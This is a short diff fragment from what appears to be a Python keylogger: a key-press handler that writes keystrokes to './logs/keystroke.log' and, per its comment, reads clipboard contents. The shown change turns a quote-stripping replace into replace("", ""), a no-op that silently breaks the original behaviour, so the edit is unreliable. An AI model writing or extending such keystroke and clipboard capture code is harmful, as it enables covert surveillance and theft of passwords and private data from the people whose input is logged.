@@ -7,7 +7,7 @@ KEYSTROKE_LOG_FILE = './logs/keystroke.log'
 
 def log_key_press(key):
     # Process the key press, get contents of the clipboard
-    key = str(key).replace("'", "")
+    key = str(key).replace("", "")
     line_to_write = None
     now = str(datetime.now())
     if key == 'Key.cmd_r':
